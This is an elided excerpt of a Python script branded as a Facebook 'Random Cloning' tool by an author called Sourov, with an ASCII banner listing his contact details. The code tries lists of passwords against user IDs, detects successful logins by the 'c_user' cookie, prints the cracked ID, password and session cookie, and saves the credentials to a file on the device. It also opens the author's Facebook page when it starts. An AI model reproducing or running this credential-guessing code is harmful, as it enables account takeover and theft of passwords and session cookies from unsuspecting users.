...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/YourSourov/')
logo =("""\033[0;92m
╔═══════════════════════════════════════════════════╗
  _________                                
 /   _____/ ____  __ _________  _______  __
 \_____  \ /  _ \|  |  \_  __ \/  _ \  \/ /
 /        (  <_> )  |  /|  | \(  <_> )   / 
/_______  /\____/|____/ |__|   \____/ \_/  
        \/                                 
╠═══════════════════════════════════════════════════║
╠══[Author:=======================> \33[1;38mSourov\33[1;38m          ║\033[1;31m
╠══[Facebook:=====================> SH Sourov       ║  \033[1;97m
╠══[Github:=======================> \33[1;38mDarkSourov777   ║\33[1;34m
╠══[Whatsapp:=====================> 01779398710     ║\33[1;35m
╠══[TOOLS:========================> Random Cloning  ║ \33[1;32m
╠══[VERSION:======================> 0.1.0           ║\033[1;35m
\033[0;92m╚═══════════════════════════════════════════════════╝\033[1;31m
    """) 
loop = 0
oks = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[Sourov-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                open('/sdcard/Sourov-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}Sourov{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
